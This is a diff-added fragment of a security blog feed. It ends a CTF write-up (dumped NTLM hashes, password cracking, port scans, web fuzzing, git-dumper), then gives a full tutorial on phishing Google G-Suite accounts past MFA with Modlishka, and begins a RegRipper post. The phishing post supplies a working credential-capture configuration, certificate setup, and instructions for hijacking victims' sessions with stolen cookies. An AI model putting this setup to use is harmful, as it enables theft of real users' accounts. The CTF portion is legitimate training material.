+	 * NTLM     : 8ab015e5cc1302d061dfefe6fb3dce12
+	 * SHA1     : b2ecd0de4dc885e66ac28546558761c5e40a5ce1
+	tspkg :
+	wdigest :
+	 * Username : Rodrigo Gonzales
+	 * Domain   : WORKSTATION
+	 * Password : (null)
+	kerberos :
+	 * Username : Rodrigo Gonzales
+	 * Domain   : WORKSTATION
+	 * Password : (null)
+	ssp :
+	credman :
+Authentication Id : 0 ; 1076008 (00000000:00106b28)
+Session           : Interactive from 1
+User Name         : Rodrigo Gonzales
+Domain            : WORKSTATION
+Logon Server      : WORKSTATION
+Logon Time        : 12/02/2020 22.54.23
+SID               : S-1-5-21-2034586335-2782532192-897599191-1001
+	msv :
+	 [00000003] Primary
+	 * Username : Rodrigo Gonzales
+	 * Domain   : WORKSTATION
+	 * NTLM     : 8ab015e5cc1302d061dfefe6fb3dce12
+	 * SHA1     : b2ecd0de4dc885e66ac28546558761c5e40a5ce1
+	tspkg :
+	wdigest :
+	 * Username : Rodrigo Gonzales
+	 * Domain   : WORKSTATION
+	 * Password : (null)
+	kerberos :
+	 * Username : Rodrigo Gonzales
+	 * Domain   : WORKSTATION
+	 * Password : (null)
+	ssp :
+	credman :
+</code></pre><p>Let&rsquo;s put this hash to file and try cracking them:</p>
+<pre tabindex="0"><code>~$ echo &quot;Rodrigo Gonzales:1001:8ab015e5cc1302d061dfefe6fb3dce12:8ab015e5cc1302d061dfefe6fb3dce12:::&quot; &gt; Q: hash.txt
+~$ sudo john --format=NT -w /usr/share/wordlists/rockyou.txt hash.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (NT [MD4 128/128 AVX 4x3])
+Warning: no OpenMP support for this hash type, consider --fork=4
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:00:00 DONE (2020-07-23 08:50) 0g/s 18873Kp/s 18873Kc/s 18873KC/s      markinho..*7¡Vamos!
+Session completed
+</code></pre><p>Maybe we should get better wordlist? Let&rsquo;s try this one: <a href="https://github.com/jvesiluoma/wordlists/blob/master/fin-swe-passwdlist.7z">https://github.com/jvesiluoma/wordlists/blob/master/fin-swe-passwdlist.7z</a></p>
+<pre tabindex="0"><code>~$ wget https://github.com/jvesiluoma/wordlists/raw/master/fin-swe-passwdlist.7z
+~$ 7z x fin-swe-passwdlist.7z
+~$ sudo john --format=NT --wordlist=fin-swe-passwdlist.7z hash.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (NT [MD4 128/128 AVX 4x3])
+Warning: no OpenMP support for this hash type, consider --fork=4
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:00:00 DONE (2020-07-23 08:57) 0g/s 3637Kp/s 3637Kc/s 3637KC/s ..
+Session completed
+</code></pre><p>No bonus. This list was supposed to have the password. However, it might be in cleartext in memory so let&rsquo;s make password list from memory:</p>
+<pre tabindex="0"><code>$ cat strings_endian.txt|sort -u &gt; Q: from_memory.txt
+$ sudo john --format=NT --wordlist=from_memory.txt hash.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (NT [MD4 128/128 AVX 4x3])
+Warning: no OpenMP support for this hash type, consider --fork=4
+Press 'q' or Ctrl-C to abort, almost any other key for status
+perse500!        (Rodrigo Gonzales)
+1g 0:00:00:00 DONE (2020-07-23 08:59) 20.00g/s 11533Kp/s 11533Kc/s 11533KC/s Perse..\PersistentAddinsRegistered
+Use the &quot;--show --format=NT&quot; options to display all of the cracked passwords reliably
+Session completed
+</code></pre><p>Password for Rodrigo Gonzales is &ldquo;perse500!&rdquo;. The password was supposed to be Perse500, which is on <a href="https://twitter.com/jvesiluoma">jvesiluoma&rsquo;s</a> combination list.</p>
+<hr>
+<h1 id="challenges---q-web">Challenges -&gt; Q: Web</h1>
+<h2 id="discovering-tcp-1">Discovering TCP #1</h2>
+<blockquote>
+<p>Q: What abnormal TCP port is open on target.helsec.fi?</p>
+</blockquote>
+<p>Let&rsquo;s NMAP</p>
+<pre tabindex="0"><code>~$ sudo nmap target.helsec.fi -v
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-18 14:27 EDT
+Initiating Ping Scan at 14:27
+Scanning target.helsec.fi (167.71.0.121) [4 ports]
+Completed Ping Scan at 14:27, 0.04s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 14:27
+Completed Parallel DNS resolution of 1 host. at 14:27, 0.00s elapsed
+Initiating SYN Stealth Scan at 14:27
+Scanning target.helsec.fi (167.71.0.121) [1000 ports]
+Discovered open port 80/tcp on 167.71.0.121
+Discovered open port 22/tcp on 167.71.0.121
+Discovered open port 31337/tcp on 167.71.0.121
+Completed SYN Stealth Scan at 14:28, 53.24s elapsed (1000 total ports)
+Nmap scan report for target.helsec.fi (167.71.0.121)
+Host is up (0.038s latency).
+Not shown: 997 filtered ports
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+31337/tcp open  Elite
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 53.39 seconds
+          Raw packets sent: 2040 (89.580KB) | Rcvd: 1050 (42.037KB)
+</code></pre><p>The port 31337 is not normal.</p>
+<h2 id="discovering-tcp-2">Discovering TCP #2</h2>
+<blockquote>
+<p>Q: Can you interact with the port 31337/tcp on target.helsec.fi?</p>
+</blockquote>
+<pre tabindex="0"><code> ~$ host target.helsec.fi
+target.helsec.fi has address 167.71.0.121
+~$ nc -nv 167.71.0.121 31337
+(UNKNOWN) [167.71.0.121] 31337 (?) open
+PLZ ANSWER SOMETHING
+SOMETHING
+flag{INTERACTING_WITH_SOCKETS_IS_EZ}
+</code></pre><h2 id="discovering-udp">Discovering UDP</h2>
+<blockquote>
+<p>Q: What abnormal UDP port is open on target.helsec.fi?</p>
+</blockquote>
+<p>I&rsquo;ve no idea what I&rsquo;ve been thinking when I created the challenge. The listener I coded does not response anything which means there&rsquo;s no way to solve this challenge out. =)</p>
+<p>The answer however was 13.</p>
+<h2 id="web-1">Web #1</h2>
+<blockquote>
+<p>Q: Find the secret admin panel on <a href="http://target.helsec.fi">http://target.helsec.fi</a>.</p>
+</blockquote>
+<p>Let&rsquo;s fuzz the web:</p>
+<pre tabindex="0"><code>~$ ffuf -u http://target.helsec.fi/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt                                              
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.1.0-git
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://target.helsec.fi/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+________________________________________________
+
+index.html              [Status: 200, Size: 368, Words: 41, Lines: 18]
+personals               [Status: 301, Size: 169, Words: 5, Lines: 8]
+web-console             [Status: 301, Size: 169, Words: 5, Lines: 8]
+:: Progress: [4655/4655] :: Job [1/1] :: 1163 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
+~$ curl -L http://target.helsec.fi/web-console
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;center&gt;&lt;h1&gt;403 Forbidden&lt;/h1&gt;&lt;/center&gt;
+&lt;hr&gt;&lt;center&gt;nginx/1.19.0&lt;/center&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+~$ curl -L http://target.helsec.fi/personals  
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;center&gt;&lt;h1&gt;403 Forbidden&lt;/h1&gt;&lt;/center&gt;
+&lt;hr&gt;&lt;center&gt;nginx/1.19.0&lt;/center&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+</code></pre><p>Okay. We found personals and web-console directories, let&rsquo;s continue:</p>
+<pre tabindex="0"><code>~$ ffuf -u http://target.helsec.fi/web-console/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.1.0-git
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://target.helsec.fi/web-console/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+________________________________________________
+
+:: Progress: [4655/4655] :: Job [1/1] :: 1163 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
+~$ ffuf -u http://target.helsec.fi/personals/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.1.0-git
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://target.helsec.fi/personals/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+________________________________________________
+
+:: Progress: [4655/4655] :: Job [1/1] :: 1163 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
+</code></pre><p>Nothing :(</p>
+<p>Let&rsquo;s change wordlist:</p>
+<pre tabindex="0"><code>~$ ffuf -u http://target.helsec.fi/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/quickhits.txt
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.1.0-git
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://target.helsec.fi/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/quickhits.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+________________________________________________
+
+/web-console/           [Status: 403, Size: 153, Words: 3, Lines: 8]
+/web-console/Invoker    [Status: 200, Size: 25, Words: 1, Lines: 2]
+:: Progress: [2439/2439] :: Job [1/1] :: 1219 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
+~$ curl http://target.helsec.fi/web-console/Invoker
+flag{TH1S_WAS_QUICK_HIT}
+</code></pre><p>Boom, we got a flag: flag{TH1S_WAS_QUICK_HIT}</p>
+<h2 id="web-2">Web #2</h2>
+<blockquote>
+<p>Q: There&rsquo;s a png file on <a href="http://target.helsec.fi">http://target.helsec.fi</a>. Find it.</p>
+</blockquote>
+<p>Let&rsquo;s see if there is png files in the personals directory we found in the previous challenge:</p>
+<pre tabindex="0"><code>~$ ffuf -u http://target.helsec.fi/personals/FUZZ.png -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.1.0-git
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://target.helsec.fi/personals/FUZZ.png
+ :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+________________________________________________
+
+whois                   [Status: 200, Size: 40, Words: 1, Lines: 2]
+:: Progress: [4655/4655] :: Job [1/1] :: 1163 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
+</code></pre><p>OMG! A photo of me, this can&rsquo;t be good:</p>
+<pre tabindex="0"><code>curl http://target.helsec.fi/personals/whois.png
+flag{THANK_GOD_THERE_WAS_NO_PHOTO_HERE}
+</code></pre><p>What the flag says&hellip; flag{THANK_GOD_THERE_WAS_NO_PHOTO_HERE}</p>
+<h2 id="web-3">Web #3</h2>
+<blockquote>
+<p>Q: Check the other project on <a href="http://target.helsec.fi">http://target.helsec.fi</a> as well.</p>
+</blockquote>
+<p>There&rsquo;s some other project mentioned on the front page:</p>
+<pre tabindex="0"><code>~$ curl http://target.helsec.fi
+&lt;!doctype html&gt;
+
+&lt;html lang=&quot;en&quot;&gt;
+	&lt;head&gt;
+		  &lt;meta charset=&quot;utf-8&quot;&gt;
+
+		    &lt;title&gt;Target site&lt;/title&gt;
+		      &lt;meta name=&quot;description&quot; content=&quot;This beautiful site was made by whois&quot;&gt;
+		        &lt;meta name=&quot;author&quot; content=&quot;whois&quot;&gt;
+
+	&lt;/head&gt;
+
+	&lt;body&gt;
+		&lt;h1&gt;Target website&lt;/h1&gt;
+		&lt;p&gt;Check my &lt;a href=&quot;http://loremipsum.helsec.fi&quot;&gt;blog project&lt;/a&gt; Q: too.
+	&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>Let&rsquo;s check it:</p>
+<pre tabindex="0"><code>~$ host loremipsum.helsec.fi
+loremipsum.helsec.fi has address 127.0.0.1
+</code></pre><p>The domain is pointing to localhost, maybe it&rsquo;s a <a href="https://www.webopedia.com/TERM/V/virtual_host.html">vhost</a>?</p>
+<pre tabindex="0"><code>~$ curl -H &quot;Host: loremipsum.helsec.fi&quot; http://target.helsec.fi
+flag{VHOSTS_ARE_OFTEN_USED_IN_HAXXOR_CHALLENGES}
+</code></pre><p>Aaaand we got a flag!!!</p>
+<h2 id="web-4">Web #4</h2>
+<blockquote>
+<p>Q: There&rsquo;s something more in <a href="http://loremipsum.helsec.fi">http://loremipsum.helsec.fi</a>&hellip;. Can you find it?</p>
+</blockquote>
+<p>Time to fuff again:</p>
+<pre tabindex="0"><code>~$ ffuf -H &quot;Host: loremipsum.helsec.fi&quot; -u http://target.helsec.fi/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.1.0-git
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://target.helsec.fi/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+ :: Header           : Host: loremipsum.helsec.fi
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+________________________________________________
+
+.git/HEAD               [Status: 200, Size: 23, Words: 2, Lines: 2]
+index.html              [Status: 200, Size: 49, Words: 1, Lines: 2]
+:: Progress: [4655/4655] :: Job [1/1] :: 1163 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
+</code></pre><p>OMG, there&rsquo;s a git repo. Let&rsquo;s get it using <a href="https://github.com/arthaud/git-dumper">git-dumper</a>! But first add the vhost to hosts file:</p>
+<pre tabindex="0"><code>cat /etc/hosts
+127.0.0.1	localhost
+127.0.1.1	kali
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+
+167.71.0.121	target.helsec.fi loremipsum.helsec.fi
+</code></pre><p>Now we are good to go:</p>
+<pre tabindex="0"><code>git-dumper.py http://loremipsum.helsec.fi/.git/HEAD dump
+[-] Testing http://loremipsum.helsec.fi/.git/HEAD [200]
+[-] Testing http://loremipsum.helsec.fi/.git/ [403]
+[-] Fetching common files
+[-] Fetching http://loremipsum.helsec.fi/.git/COMMIT_EDITMSG [200]
+[-] Fetching http://loremipsum.helsec.fi/.gitignore [404]
+[-] Fetching http://loremipsum.helsec.fi/.git/hooks/applypatch-msg.sample [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/description [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/hooks/commit-msg.sample [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/hooks/post-commit.sample [404]
+[-] Fetching http://loremipsum.helsec.fi/.git/hooks/post-receive.sample [404]
+[-] Fetching http://loremipsum.helsec.fi/.git/hooks/post-update.sample [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/hooks/pre-applypatch.sample [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/hooks/pre-commit.sample [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/hooks/pre-push.sample [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/hooks/pre-receive.sample [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/hooks/prepare-commit-msg.sample [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/hooks/update.sample [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/objects/info/packs [404]
+[-] Fetching http://loremipsum.helsec.fi/.git/hooks/pre-rebase.sample [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/index [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/info/exclude [200]
+[-] Finding refs/
+[-] Fetching http://loremipsum.helsec.fi/.git/FETCH_HEAD [404]
+[-] Fetching http://loremipsum.helsec.fi/.git/HEAD [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/config [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/info/refs [404]
+[-] Fetching http://loremipsum.helsec.fi/.git/ORIG_HEAD [404]
+[-] Fetching http://loremipsum.helsec.fi/.git/logs/HEAD [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/logs/refs/remotes/origin/HEAD [404]
+[-] Fetching http://loremipsum.helsec.fi/.git/logs/refs/heads/master [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/logs/refs/remotes/origin/master [404]
+[-] Fetching http://loremipsum.helsec.fi/.git/logs/refs/stash [404]
+[-] Fetching http://loremipsum.helsec.fi/.git/packed-refs [404]
+[-] Fetching http://loremipsum.helsec.fi/.git/refs/heads/master [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/refs/remotes/origin/HEAD [404]
+[-] Fetching http://loremipsum.helsec.fi/.git/refs/remotes/origin/master [404]
+[-] Fetching http://loremipsum.helsec.fi/.git/refs/stash [404]
+[-] Fetching http://loremipsum.helsec.fi/.git/refs/wip/wtree/refs/heads/master [404]
+[-] Fetching http://loremipsum.helsec.fi/.git/refs/wip/index/refs/heads/master [404]
+[-] Finding packs
+[-] Finding objects
+[-] Fetching objects
+[-] Fetching http://loremipsum.helsec.fi/.git/objects/6f/509d1e83a851aa621036f3d0770e44c4969eba [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/objects/d3/e4d4e4aea12282ec91aa6c5888d7bc0969b413 [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/objects/9d/472888c48febd2d52c88109bfae948751ec780 [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/objects/00/00000000000000000000000000000000000000 [404]
+[-] Fetching http://loremipsum.helsec.fi/.git/objects/b6/59f196ba24a08e044fe09c46557dad20a01522 [200]
+[-] Fetching http://loremipsum.helsec.fi/.git/objects/96/8186f4d13375526fed7966fdd783dd6d5bcaef [200]
+[-] Running git checkout .
+</code></pre><p>The directory contains only one file:</p>
+<pre tabindex="0"><code>~$ ls dump
+flag.txt
+~$ cat dump/flag.txt
+flag{LEAVING_GITS_OPEN_LIKE_THIS_IS_DANGEROUS}
+</code></pre><p>The flag is: flag{LEAVING_GITS_OPEN_LIKE_THIS_IS_DANGEROUS}</p>
+<hr>
+]]></content></item><item><title>[0x05] Phishing MFA accounts</title><link>https://who1s.github.io/posts/2020/07/0x05-phishing-mfa-accounts/</link><pubDate>Wed, 22 Jul 2020 12:00:00 +0000</pubDate><guid>https://who1s.github.io/posts/2020/07/0x05-phishing-mfa-accounts/</guid><description>MFA is usually considered secure. It however can be bypassed by phishing. I made this phishing demo using drk1wi&amp;rsquo;s tool Modlishka. The tool default templates are little bit outdated so here&amp;rsquo;s also instructions how to make it work against G-Suite accounts. This is not a new thing, I just wanted to check if it still works. =)
+The full configuration is on Github.
+Demo {% include vimeoPlayer.html id=page.vimeoId %}</description><content type="html"><![CDATA[<blockquote>
+<p>MFA is usually considered secure. It however can be bypassed by phishing. I made this phishing demo using <a href="https://github.com/drk1wi">drk1wi&rsquo;s</a> tool <a href="https://github.com/drk1wi/Modlishka">Modlishka</a>. The tool default templates are little bit outdated so here&rsquo;s also instructions how to make it work against G-Suite accounts. This is not a new thing, I just wanted to check if it still works. =)</p>
+</blockquote>
+<p><img src="/assets/images/legit_site.png" alt="Screenshot"></p>
+<p>The full configuration is on <a href="https://github.com/who1s/modlishka-config">Github</a>.</p>
+<h2 id="demo">Demo</h2>
+<p>{% include vimeoPlayer.html id=page.vimeoId %}</p>
+<h2 id="put-it-to-the-container">Put it to the container</h2>
+<p>I decided to do quick and dirty dockerization for the tool:</p>
+<pre tabindex="0"><code>FROM alpine
+FROM golang
+RUN go get -u github.com/drk1wi/Modlishka
+RUN cd $GOPATH/src/github.com/drk1wi/Modlishka/ &amp;&amp; make
+COPY modlishka.json /tmp/
+</code></pre><p>To build and run the docker container easily, I made a script:</p>
+<pre tabindex="0"><code>#!/bin/bash
+
+docker build -t phishing-demo-mfa .
+
+# Generate few example id's
+for i in {1..5}
+do
+	echo &quot;https://phishing.fi/?id=&quot;$i
+done
+
+docker run -p80:80 -p443:443 -it --rm phishing-demo-mfa Modlishka -config /tmp/modlishka.json
+</code></pre><h2 id="generating-certificate">Generating certificate</h2>
+<p>To make the phishing site look legit, we need a valid certificate. <a href="https://letsencrypt.org/">Let&rsquo;s Encrypt (LE)</a> is free to use and trusted certificate provider which supports wildcard certificates. The phishing site could be made more legit by playing around with <a href="https://en.wikipedia.org/wiki/IDN_homograph_attack">IDN</a>, using <a href="https://en.wikipedia.org/wiki/Typosquatting">typosquatted domain name</a> or simply using subdomains like google.com.phishing.fi.</p>
+<p>Let&rsquo;s generate the certificate and follow instructions. Acquiring the certificate requires adding some DNS TXT records to your domain.</p>
+<pre tabindex="0"><code># apt-get update &amp;&amp; apt-get install certbot
+# certbot certonly --manual --preferred-challenges dns --manual-public-ip-logging-ok -d '*.phishing.fi' -d phishing.fi
+# cp -r /etc/letsencrypt/archive/phishing.fi/ .
+</code></pre><p>The Modlishka wants certificate in different format so let&rsquo;s convert it accordingly:</p>
+<pre tabindex="0"><code># openssl rsa -in privkey1.pem -out priv.key
+# sed -i ':a;N;$!ba;s/\n/\\n/g' priv.key
+# sed -i ':a;N;$!ba;s/\n/\\n/g' fullchain1.pem
+</code></pre><h2 id="fixing-the-configuration">Fixing the configuration</h2>
+<p>The <a href="https://github.com/drk1wi/Modlishka/blob/master/templates/google.com_gsuite.json">Modlishka G-Suite template in Github</a> seems to be obsolete. The JSON payload it tries to parse does not include the user name anymore. As the template does not work out of the box, I decided to look into G-Suite authentication process and do modifications accordingly.</p>
+<p>Google authentication is doing a POST request where both email address and password are in params.</p>
+<p><img src="/assets/images/phishburp.png" alt="Screenshot"></p>
+<p>This is the best place to grab the credentials so we need to adjust Modlishka&rsquo;s credParams configuration to do it:</p>
+<p>Username</p>
+<pre tabindex="0"><code>identifierInput=([^\W]+[\.,\-,\_]{0,}\w+[\@,\%40]\w+[\.,\-,\_]{0,}\w+\.\w{2,5})
+</code></pre><p>Password</p>
+<pre tabindex="0"><code>password=([a-zA-Z0-9&quot;!&quot;#$%&amp;'()*+,-./:;&lt;=&gt;?@^_{|}~]+)&amp;ca
+</code></pre><p>These regex expressions I made with <a href="https://regex101.com">regex101</a> should grab the email address and the password from given parameters. The Modlishka requires regex in base64 encoded format so the final configuration line would look like this:</p>
+<pre tabindex="0"><code>&quot;credParams&quot;: &quot;aWRlbnRpZmllcj0oW15cV10rW1wuLFwtLFxfXXswLH1cdytbXEAsXCU0MF1cdytbXC4sXC0sXF9dXHcrXC5cd3swLDV9KQ==,cGFzc3dvcmQ9KFthLXpBLVowLTkiISIjJCUmJygpKissLS4vOjs8PT4/QF5fe3x9fl0rKSZjYQ==&quot;,
+</code></pre><p>I also wanted to terminate the connection after the victim has successfully logged in. Reviewing the login process on Google shows the user is being redirected to Mail box after successful login. This means the mailbox URI can be used as a termination string:</p>
+<pre tabindex="0"><code>&quot;terminateTriggers&quot;: &quot;/mail/u/&quot;,
+</code></pre><p>The victim should be redirected to somewhere after the login which could be the real Google mail account for example. For demonstration purposes, we&rsquo;re gonna use this &ldquo;funny&rdquo; &ldquo;hacked&rdquo; meme:</p>
+<pre tabindex="0"><code>&quot;terminateRedirectUrl&quot;: &quot;https://i0.wp.com/nexxytech.com/wp-content/uploads/2016/08/cheers.jpg&quot;,
+</code></pre><p>The tracking ID should also be adjusted:</p>
+<pre tabindex="0"><code>&quot;trackingParam&quot;: &quot;id&quot;,
+</code></pre><p>The full configuration is here without certificates:</p>
+<pre tabindex="0"><code># cat modlishka.json
+{
+  &quot;proxyDomain&quot;: &quot;phishing.fi&quot;, // Your domain
+  &quot;listeningAddress&quot;: &quot;0.0.0.0&quot;,
+  &quot;proxyAddress&quot;: &quot;&quot;,
+  &quot;target&quot;: &quot;mail.google.com&quot;,
+  &quot;targetResources&quot;: &quot;content.googleapis.com,www.gstatic.com,ssl.gstatic.com,ogs.google.com,clients1.google.com,clients2.google.com,clients3.google.com,clients4.google.com,clients5.google.com,clients6.google.com&quot;,
+  &quot;rules&quot;: &quot;&quot;,
+  &quot;terminateTriggers&quot;: &quot;/mail/u/&quot;,
+  &quot;terminateRedirectUrl&quot;: &quot;https://i0.wp.com/nexxytech.com/wp-content/uploads/2016/08/cheers.jpg&quot;,
+  &quot;trackingCookie&quot;: &quot;ident&quot;,
+  &quot;trackingParam&quot;: &quot;id&quot;,
+  &quot;jsRules&quot;:&quot;&quot;,
+  &quot;jsReflectParam&quot;: &quot;reflect&quot;,
+  &quot;debug&quot;: false,
+  &quot;forceHTTPS&quot;: false,
+  &quot;forceHTTP&quot;: false,
+  &quot;dynamicMode&quot;: false,
+  &quot;logPostOnly&quot;: false,
+  &quot;disableSecurity&quot;: false,
+  &quot;log&quot;: &quot;google.log&quot;,
+  &quot;plugins&quot;: &quot;all&quot;,
+  &quot;credParams&quot;: &quot;aWRlbnRpZmllcj0oW15cV10rW1wuLFwtLFxfXXswLH1cdytbXEAsXCU0MF1cdytbXC4sXC0sXF9dXHcrXC5cd3swLDV9KQ==,cGFzc3dvcmQ9KFthLXpBLVowLTkiISIjJCUmJygpKissLS4vOjs8PT4/QF5fe3x9fl0rKSZjYQ==&quot;,
+  &quot;cert&quot;: &quot;&quot;, // fullchain1.pem here
+  &quot;certKey&quot;: &quot;&quot;, // priv.key here
+  &quot;certPool&quot;: &quot;&quot;
+}
+</code></pre><h2 id="using-the-stolen-credentials">Using the stolen credentials</h2>
+<p>After victim has logged in using the Modlishka proxypage, we can use their cookies to log in by visiting Google&rsquo;s email and setting the gathered cookies for example with Moustachauve&rsquo;s <a href="https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/">Cookie-Editor</a> and refreshing the page.</p>
+<h2 id="resources">Resources</h2>
+<ul>
+<li><a href="https://github.com/drk1wi/Modlishka">Modlishka</a></li>
+<li><a href="https://github.com/who1s/modlishka-config">My configuration</a></li>
+</ul>
+<h2 id="disclaimer">Disclaimer</h2>
+<p>This demo is only for demonstration and education purposes. Do not use these instructions to anything illegal.</p>
+]]></content></item><item><title>[0x04] Installing RegRipper on Linux</title><link>https://who1s.github.io/posts/2020/02/0x04-installing-regripper-on-linux/</link><pubDate>Wed, 19 Feb 2020 09:00:00 +0000</pubDate><guid>https://who1s.github.io/posts/2020/02/0x04-installing-regripper-on-linux/</guid><description>RegRipper is a tool made by H. Carvey (keydet89) for Windows registry analysis. The tool is perl script that is made to run on Windows. The tool can be installed on Linux distros but I haven&amp;rsquo;t yet found good instructions how to do it to share so I decided to make my own. I use the tool on the forensic courses I teach. Kudos to keydet89 for making this awesome tool.</description><content type="html"><![CDATA[<blockquote>
+<p>RegRipper is a tool made by H. Carvey (keydet89) for Windows registry analysis. The tool is perl script that is made to run on Windows. The tool can be installed on Linux distros but I haven&rsquo;t yet found good instructions how to do it to share so I decided to make my own. I use the tool on the forensic courses I teach. Kudos to keydet89 for making this awesome tool.</p>
+</blockquote>
+<p>If you are lazy, <a href="https://github.com/who1s/install_regripper">here&rsquo;s</a> an installation script for Ubuntu/Debian.</p>
